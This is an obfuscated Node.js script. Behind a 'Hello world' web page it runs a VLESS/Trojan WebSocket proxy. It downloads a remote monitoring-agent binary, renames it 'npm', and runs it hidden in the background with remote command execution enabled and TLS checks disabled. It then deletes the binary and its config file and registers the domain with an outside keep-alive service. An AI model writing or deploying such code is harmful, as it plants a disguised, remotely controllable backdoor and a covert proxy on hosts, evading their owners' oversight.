const _0x149f70=_0x5dd5;(function(_0x194d95,_0x4e22f8){const _0x3144f1=_0x5dd5,_0xa07316=_0x194d95();while(!![]){try{const _0xa94054=-parseInt(_0x3144f1(0x130))/0x1*(-parseInt(_0x3144f1(0xbd))/0x2)+-parseInt(_0x3144f1(0x11f))/0x3*(parseInt(_0x3144f1(0xf3))/0x4)+parseInt(_0x3144f1(0xc1))/0x5+-parseInt(_0x3144f1(0x105))/0x6*(parseInt(_0x3144f1(0x125))/0x7)+parseInt(_0x3144f1(0xf7))/0x8+-parseInt(_0x3144f1(0x135))/0x9*(parseInt(_0x3144f1(0x10d))/0xa)+parseInt(_0x3144f1(0xef))/0xb;if(_0xa94054===_0x4e22f8)break;else _0xa07316['push'](_0xa07316['shift']());}catch(_0x1e1ced){_0xa07316['push'](_0xa07316['shift']());}}}(_0x195b,0x359d6));const os=require('os'),http=require(_0x149f70(0x121)),fs=require('fs'),axios=require(_0x149f70(0xde)),net=require(_0x149f70(0xe7)),path=require(_0x149f70(0xc6)),crypto=require(_0x149f70(0x12e)),{Buffer}=require(_0x149f70(0x11b)),{exec,execSync}=require(_0x149f70(0x120)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x149f70(0xed)]||'0469dd6f-61de-4e1a-9634-3dbf31817140',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x149f70(0x116)][_0x149f70(0xe1)]||'',NEZHA_KEY=process[_0x149f70(0x116)][_0x149f70(0xb8)]||'',DOMAIN=process[_0x149f70(0x116)][_0x149f70(0x12d)]||'1234.abc.com',AUTO_ACCESS=process[_0x149f70(0x116)][_0x149f70(0xf4)]||!![],WSPATH=process['env']['WSPATH']||UUID[_0x149f70(0xd7)](0x0,0x8),SUB_PATH=process['env'][_0x149f70(0xb9)]||'sub',NAME=process[_0x149f70(0x116)][_0x149f70(0xcd)]||'',PORT=process[_0x149f70(0x116)][_0x149f70(0xc8)]||0x1eb4;let ISP='';function _0x5dd5(_0x329926,_0x260e6c){_0x329926=_0x329926-0xb8;const _0x195bc7=_0x195b();let _0x5dd565=_0x195bc7[_0x329926];return _0x5dd565;}const GetISP=async()=>{const _0x3719c5=_0x149f70;try{const _0x7236ee=await axios[_0x3719c5(0xd4)](_0x3719c5(0x118)),_0x174a20=_0x7236ee[_0x3719c5(0x119)];ISP=(_0x174a20[_0x3719c5(0x127)]+'-'+_0x174a20[_0x3719c5(0xc2)])[_0x3719c5(0xba)](/ /g,'_');}catch(_0x3bcf19){ISP=_0x3719c5(0x131);}};GetISP();const httpServer=http[_0x149f70(0x117)]((_0x37be57,_0x1b7196)=>{const _0xb2d8a3=_0x149f70;if(_0x37be57[_0xb2d8a3(0xfa)]==='/'){const _0x108153=path[_0xb2d8a3(0x10c)](__dirname,_0xb2d8a3(0xdc));fs[_0xb2d8a3(0xd1)](_0x108153,_0xb2d8a3(0xd9),(_0x79738d,_0x4992a4)=>{const _0x1961f7=_0xb2d8a3;if(_0x79738d){_0x1b7196['writeHead'](0xc8,{'Content-Type':_0x1961f7(0xc4)}),_0x1b7196[_0x1961f7(0xd2)]('Hello\x20world!');return;}_0x1b7196[_0x1961f7(0x133)](0xc8,{'Content-Type':_0x1961f7(0xc4)}),_0x1b7196[_0x1961f7(0xd2)](_0x4992a4);});return;}else{if(_0x37be57[_0xb2d8a3(0xfa)]==='/'+SUB_PATH){const _0x1c421d=NAME?NAME+'-'+ISP:ISP,_0x4c813c=_0xb2d8a3(0xd8)+UUID+'@'+DOMAIN+_0xb2d8a3(0xee)+DOMAIN+_0xb2d8a3(0x10a)+DOMAIN+_0xb2d8a3(0xe3)+WSPATH+'#'+_0x1c421d,_0x34dfd3=_0xb2d8a3(0x102)+UUID+'@'+DOMAIN+_0xb2d8a3(0x137)+DOMAIN+_0xb2d8a3(0x10a)+DOMAIN+_0xb2d8a3(0xe3)+WSPATH+'#'+_0x1c421d,_0x19230d=_0x4c813c+'\x0a'+_0x34dfd3,_0x243fbd=Buffer['from'](_0x19230d)[_0xb2d8a3(0xdb)]('base64');_0x1b7196[_0xb2d8a3(0x133)](0xc8,{'Content-Type':_0xb2d8a3(0x128)}),_0x1b7196['end'](_0x243fbd+'\x0a');}else _0x1b7196[_0xb2d8a3(0x133)](0x194,{'Content-Type':'text/plain'}),_0x1b7196[_0xb2d8a3(0xd2)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x149f70(0xdf))]({'server':httpServer}),uuid=UUID[_0x149f70(0xba)](/-/g,''),DNS_SERVERS=[_0x149f70(0x134),_0x149f70(0x10f)];function resolveHost(_0x1f0279){return new Promise((_0x29e1a1,_0x552e6b)=>{const _0x103e9f=_0x5dd5;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x103e9f(0xe2)](_0x1f0279)){_0x29e1a1(_0x1f0279);return;}let _0x162240=0x0;function _0x3491e9(){const _0x2bfd4a=_0x103e9f;if(_0x162240>=DNS_SERVERS[_0x2bfd4a(0xd3)]){_0x552e6b(new Error('Failed\x20to\x20resolve\x20'+_0x1f0279+_0x2bfd4a(0xda)));return;}const _0x113a8b=DNS_SERVERS[_0x162240];_0x162240++;const _0x8f5e7d='https://dns.google/resolve?name='+encodeURIComponent(_0x1f0279)+_0x2bfd4a(0xce);axios['get'](_0x8f5e7d,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x2bfd4a(0x12a)](_0x2c5ab7=>{const _0x9d65ac=_0x2bfd4a,_0x1115c5=_0x2c5ab7['data'];if(_0x1115c5[_0x9d65ac(0x114)]===0x0&&_0x1115c5[_0x9d65ac(0xcf)]&&_0x1115c5[_0x9d65ac(0xcf)][_0x9d65ac(0xd3)]>0x0){const _0x3c55c1=_0x1115c5['Answer'][_0x9d65ac(0x126)](_0x327cd4=>_0x327cd4[_0x9d65ac(0xec)]===0x1);if(_0x3c55c1){_0x29e1a1(_0x3c55c1[_0x9d65ac(0x119)]);return;}}_0x3491e9();})[_0x2bfd4a(0x12b)](_0x2ceed9=>{_0x3491e9();});}_0x3491e9();});}function handleVlessConnection(_0x4d3223,_0x504534){const _0x487bbb=_0x149f70,[_0x177335]=_0x504534,_0x41bf71=_0x504534[_0x487bbb(0xd7)](0x1,0x11);if(!_0x41bf71[_0x487bbb(0x138)]((_0x198560,_0x1cf0ae)=>_0x198560==parseInt(uuid['substr'](_0x1cf0ae*0x2,0x2),0x10)))return![];let _0x15d5eb=_0x504534['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x498445=_0x504534[_0x487bbb(0xd7)](_0x15d5eb,_0x15d5eb+=0x2)['readUInt16BE'](0x0),_0x4dd4c6=_0x504534[_0x487bbb(0xd7)](_0x15d5eb,_0x15d5eb+=0x1)[_0x487bbb(0xe8)](),_0x42ad1f=_0x4dd4c6==0x1?_0x504534[_0x487bbb(0xd7)](_0x15d5eb,_0x15d5eb+=0x4)[_0x487bbb(0x10c)]('.'):_0x4dd4c6==0x2?new TextDecoder()[_0x487bbb(0xfd)](_0x504534[_0x487bbb(0xd7)](_0x15d5eb+0x1,_0x15d5eb+=0x1+_0x504534[_0x487bbb(0xd7)](_0x15d5eb,_0x15d5eb+0x1)[_0x487bbb(0xe8)]())):_0x4dd4c6==0x3?_0x504534[_0x487bbb(0xd7)](_0x15d5eb,_0x15d5eb+=0x10)[_0x487bbb(0xca)]((_0x1e6bdd,_0x2f6d23,_0x4e5f3a,_0x40dfdf)=>_0x4e5f3a%0x2?_0x1e6bdd[_0x487bbb(0x12c)](_0x40dfdf['slice'](_0x4e5f3a-0x1,_0x4e5f3a+0x1)):_0x1e6bdd,[])[_0x487bbb(0x124)](_0x4a715b=>_0x4a715b[_0x487bbb(0xea)](0x0)['toString'](0x10))[_0x487bbb(0x10c)](':'):'';_0x4d3223[_0x487bbb(0x100)](new Uint8Array([_0x177335,0x0]));const _0x46ecf5=createWebSocketStream(_0x4d3223);return resolveHost(_0x42ad1f)[_0x487bbb(0x12a)](_0x2ec053=>{const _0xb6d5ca=_0x487bbb;net[_0xb6d5ca(0x101)]({'host':_0x2ec053,'port':_0x498445},function(){const _0x3c0663=_0xb6d5ca;this['write'](_0x504534['slice'](_0x15d5eb)),_0x46ecf5['on'](_0x3c0663(0x123),()=>{})[_0x3c0663(0xfb)](this)['on'](_0x3c0663(0x123),()=>{})[_0x3c0663(0xfb)](_0x46ecf5);})['on']('error',()=>{});})['catch'](_0x4d5e84=>{const _0x581b71=_0x487bbb;net[_0x581b71(0x101)]({'host':_0x42ad1f,'port':_0x498445},function(){const _0x53bb2a=_0x581b71;this[_0x53bb2a(0x129)](_0x504534[_0x53bb2a(0xd7)](_0x15d5eb)),_0x46ecf5['on']('error',()=>{})[_0x53bb2a(0xfb)](this)['on'](_0x53bb2a(0x123),()=>{})[_0x53bb2a(0xfb)](_0x46ecf5);})['on'](_0x581b71(0x123),()=>{});}),!![];}function handleTrojanConnection(_0x37df34,_0x5cda7f){const _0x51a3f1=_0x149f70;try{if(_0x5cda7f[_0x51a3f1(0xd3)]<0x3a)return![];const _0x51b69f=_0x5cda7f[_0x51a3f1(0xd7)](0x0,0x38)[_0x51a3f1(0xdb)](),_0x43ab63=[UUID];let _0x88e4ef=null;for(const _0x35db47 of _0x43ab63){const _0x481239=crypto[_0x51a3f1(0x122)](_0x51a3f1(0xc3))['update'](_0x35db47)[_0x51a3f1(0xf8)]('hex');if(_0x481239===_0x51b69f){_0x88e4ef=_0x35db47;break;}}if(!_0x88e4ef)return![];let _0x9cc28a=0x38;_0x5cda7f[_0x9cc28a]===0xd&&_0x5cda7f[_0x9cc28a+0x1]===0xa&&(_0x9cc28a+=0x2);const _0x3b4d46=_0x5cda7f[_0x9cc28a];if(_0x3b4d46!==0x1)return![];_0x9cc28a+=0x1;const _0x51e0a6=_0x5cda7f[_0x9cc28a];_0x9cc28a+=0x1;let _0xa17441,_0x30f560;if(_0x51e0a6===0x1)_0xa17441=_0x5cda7f[_0x51a3f1(0xd7)](_0x9cc28a,_0x9cc28a+0x4)[_0x51a3f1(0x10c)]('.'),_0x9cc28a+=0x4;else{if(_0x51e0a6===0x3){const _0x57fc1b=_0x5cda7f[_0x9cc28a];_0x9cc28a+=0x1,_0xa17441=_0x5cda7f[_0x51a3f1(0xd7)](_0x9cc28a,_0x9cc28a+_0x57fc1b)[_0x51a3f1(0xdb)](),_0x9cc28a+=_0x57fc1b;}else{if(_0x51e0a6===0x4)_0xa17441=_0x5cda7f[_0x51a3f1(0xd7)](_0x9cc28a,_0x9cc28a+0x10)['reduce']((_0x2b22c7,_0x2c5e78,_0x55a355,_0x54bc54)=>_0x55a355%0x2?_0x2b22c7[_0x51a3f1(0x12c)](_0x54bc54['slice'](_0x55a355-0x1,_0x55a355+0x1)):_0x2b22c7,[])['map'](_0x16d3c1=>_0x16d3c1[_0x51a3f1(0xea)](0x0)[_0x51a3f1(0xdb)](0x10))[_0x51a3f1(0x10c)](':'),_0x9cc28a+=0x10;else return![];}}_0x30f560=_0x5cda7f['readUInt16BE'](_0x9cc28a),_0x9cc28a+=0x2;_0x9cc28a<_0x5cda7f[_0x51a3f1(0xd3)]&&_0x5cda7f[_0x9cc28a]===0xd&&_0x5cda7f[_0x9cc28a+0x1]===0xa&&(_0x9cc28a+=0x2);const _0x24566d=createWebSocketStream(_0x37df34);return resolveHost(_0xa17441)[_0x51a3f1(0x12a)](_0x3ea7ad=>{const _0x34c79b=_0x51a3f1;net[_0x34c79b(0x101)]({'host':_0x3ea7ad,'port':_0x30f560},function(){const _0x46a88a=_0x34c79b;_0x9cc28a<_0x5cda7f[_0x46a88a(0xd3)]&&this[_0x46a88a(0x129)](_0x5cda7f[_0x46a88a(0xd7)](_0x9cc28a)),_0x24566d['on'](_0x46a88a(0x123),()=>{})[_0x46a88a(0xfb)](this)['on'](_0x46a88a(0x123),()=>{})[_0x46a88a(0xfb)](_0x24566d);})['on'](_0x34c79b(0x123),()=>{});})[_0x51a3f1(0x12b)](_0x2c2a22=>{const _0x2d466e=_0x51a3f1;net['connect']({'host':_0xa17441,'port':_0x30f560},function(){const _0x4aefb2=_0x5dd5;_0x9cc28a<_0x5cda7f[_0x4aefb2(0xd3)]&&this['write'](_0x5cda7f[_0x4aefb2(0xd7)](_0x9cc28a)),_0x24566d['on'](_0x4aefb2(0x123),()=>{})[_0x4aefb2(0xfb)](this)['on'](_0x4aefb2(0x123),()=>{})[_0x4aefb2(0xfb)](_0x24566d);})['on'](_0x2d466e(0x123),()=>{});}),!![];}catch(_0x9ed3b){return![];}}wss['on'](_0x149f70(0xd6),(_0x39d156,_0x19b1b1)=>{const _0x116caa=_0x149f70,_0x497181=_0x19b1b1[_0x116caa(0xfa)]||'';_0x39d156[_0x116caa(0xf2)](_0x116caa(0xf6),_0x26da51=>{const _0x3eebde=_0x116caa;if(_0x26da51['length']>0x11&&_0x26da51[0x0]===0x0){const _0x5915af=_0x26da51[_0x3eebde(0xd7)](0x1,0x11),_0x75ec95=_0x5915af[_0x3eebde(0x138)]((_0x3ec89d,_0x136253)=>_0x3ec89d==parseInt(uuid[_0x3eebde(0x108)](_0x136253*0x2,0x2),0x10));if(_0x75ec95){!handleVlessConnection(_0x39d156,_0x26da51)&&_0x39d156['close']();return;}}!handleTrojanConnection(_0x39d156,_0x26da51)&&_0x39d156[_0x3eebde(0x11d)]();})['on'](_0x116caa(0x123),()=>{});});const getDownloadUrl=()=>{const _0x2e55b5=_0x149f70,_0xa2fd69=os[_0x2e55b5(0xf5)]();return _0xa2fd69===_0x2e55b5(0xe0)||_0xa2fd69===_0x2e55b5(0xe9)||_0xa2fd69===_0x2e55b5(0x10e)?!NEZHA_PORT?_0x2e55b5(0x12f):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x2e55b5(0xc0);},downloadFile=async()=>{const _0x197191=_0x149f70;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xdd5324=getDownloadUrl(),_0x399d84=await axios({'method':_0x197191(0xd4),'url':_0xdd5324,'responseType':'stream'}),_0x11831c=fs['createWriteStream'](_0x197191(0xe4));return _0x399d84[_0x197191(0x119)][_0x197191(0xfb)](_0x11831c),new Promise((_0x164576,_0x27b333)=>{const _0x32b3e8=_0x197191;_0x11831c['on'](_0x32b3e8(0x110),()=>{const _0x2f3bf9=_0x32b3e8;console[_0x2f3bf9(0xe5)](_0x2f3bf9(0xbb)),exec('chmod\x20+x\x20npm',_0x1f712f=>{if(_0x1f712f)_0x27b333(_0x1f712f);_0x164576();});}),_0x11831c['on'](_0x32b3e8(0x123),_0x27b333);});}catch(_0x4f9d37){throw _0x4f9d37;}},runnz=async()=>{const _0x48a195=_0x149f70;try{const _0x52fbf2=execSync(_0x48a195(0xff),{'encoding':_0x48a195(0xcb)});if(_0x52fbf2[_0x48a195(0x107)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x376fa5){}await downloadFile();let _0x244240='',_0x460cb5=[_0x48a195(0xf1),_0x48a195(0xfc),_0x48a195(0x11a),_0x48a195(0x111),_0x48a195(0x10b),_0x48a195(0xf9)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x56f1c4=_0x460cb5[_0x48a195(0x11c)](NEZHA_PORT)?_0x48a195(0x109):'';_0x244240=_0x48a195(0xfe)+NEZHA_SERVER+':'+NEZHA_PORT+_0x48a195(0xcc)+NEZHA_KEY+'\x20'+_0x56f1c4+_0x48a195(0xe6);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x54df20=NEZHA_SERVER[_0x48a195(0x11c)](':')?NEZHA_SERVER[_0x48a195(0x115)](':')[_0x48a195(0x104)]():'',_0x2b2bb4=_0x460cb5['includes'](_0x54df20)?_0x48a195(0xf0):_0x48a195(0xc5),_0x1c2235='client_secret:\x20'+NEZHA_KEY+_0x48a195(0xbf)+NEZHA_SERVER+_0x48a195(0xbe)+_0x2b2bb4+_0x48a195(0x103)+UUID;fs[_0x48a195(0xbc)](_0x48a195(0x112),_0x1c2235);}_0x244240=_0x48a195(0x113);}else{console[_0x48a195(0xe5)](_0x48a195(0x136));return;}}try{exec(_0x244240,{'shell':_0x48a195(0xd5)},_0x59b1ac=>{const _0x4fbde4=_0x48a195;if(_0x59b1ac)console[_0x4fbde4(0x123)]('npm\x20running\x20error:',_0x59b1ac);else console[_0x4fbde4(0xe5)](_0x4fbde4(0x11e));});}catch(_0xfb7bc2){console['error'](_0x48a195(0xdd)+_0xfb7bc2);}};async function addAccessTask(){const _0x56fe45=_0x149f70;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1c9183=_0x56fe45(0xc7)+DOMAIN;try{const _0x3643de=await axios[_0x56fe45(0xeb)]('https://oooo.serv00.net/add-url',{'url':_0x1c9183},{'headers':{'Content-Type':_0x56fe45(0x132)}});console[_0x56fe45(0xe5)](_0x56fe45(0xc9));}catch(_0x22967f){}}const delFiles=()=>{const _0xdd2914=_0x149f70;fs[_0xdd2914(0x106)](_0xdd2914(0xe4),()=>{}),fs[_0xdd2914(0x106)](_0xdd2914(0x112),()=>{});};httpServer[_0x149f70(0xd0)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});function _0x195b(){const _0x33583b=['vless://','utf8','\x20with\x20all\x20DNS\x20servers','toString','index.html','error:\x20','axios','Server','arm','NEZHA_PORT','test','&path=%2F','npm','log','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','net','readUInt8','arm64','readUInt16BE','post','type','UUID',':443?encryption=none&security=tls&sni=','8507015QOafQM','true','443','once','4rPXBlR','AUTO_ACCESS','arch','message','1086944QBawYS','digest','2053','url','pipe','8443','decode','setsid\x20nohup\x20./npm\x20-s\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','send','connect','trojan://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','pop','3324vSnkEQ','unlink','trim','substr','--tls','&fp=chrome&type=ws&host=','2083','join','1684330dBfzqr','aarch64','1.1.1.1','finish','2087','config.yaml','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Status','split','env','createServer','https://api.ip.sb/geoip','data','2096','buffer','includes','close','npm\x20is\x20running','392199TmHFya','child_process','http','createHash','error','map','3864gAPcfX','find','country_code','text/plain','write','then','catch','concat','DOMAIN','crypto','https://arm64.ssss.nyc.mn/v1','3boaIfe','Unknown','application/json','writeHead','8.8.4.4','18fkpchp','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running',':443?security=tls&sni=','every','NEZHA_KEY','SUB_PATH','replace','npm\x20download\x20successfully','writeFileSync','47298HbncHx','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://amd64.ssss.nyc.mn/agent','64165WHLWDM','isp','sha224','text/html','false','path','https://','PORT','Automatic\x20Access\x20Task\x20added\x20successfully','reduce','utf-8','\x20-p\x20','NAME','&type=A','Answer','listen','readFile','end','length','get','/bin/bash','connection','slice'];_0x195b=function(){return _0x33583b;};return _0x195b();}
